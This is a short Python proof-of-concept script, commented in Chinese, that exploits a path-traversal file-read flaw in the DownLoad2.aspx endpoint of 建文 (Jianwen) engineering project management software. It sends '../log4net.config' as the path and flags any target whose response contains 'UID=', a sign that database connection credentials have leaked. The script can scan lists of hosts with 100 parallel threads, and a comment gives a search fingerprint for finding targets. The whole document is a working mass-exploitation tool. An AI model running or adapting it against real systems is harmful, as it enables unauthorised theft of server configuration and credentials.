#建文工程项目管理软件 DownLoad2.aspx 文件读取漏洞
#body="Login/QRLogin.ashx"
import requests,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
    parser = argparse.ArgumentParser(description="建文文件读取")

    parser.add_argument('-u','--url',dest='url',type=str,help='Please inpur url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input flie')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"usage：{sys.argv[0]} -h or --help")
def poc(target):
    payload = "/Common/DownLoad2.aspx"
    headers = {
        'Content-Type': 'application/x-www-form-urlencodedUser-Agent: Mozilla/5.0',
        'Content-Length': '28',
    }
    data = "path=../log4net.config&Name="
    try:
        res1 = requests.post(url=target+payload,data=data,verify=False,timeout=10,headers=headers)
        if 'UID=' in res1.content.decode("utf-8"):
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()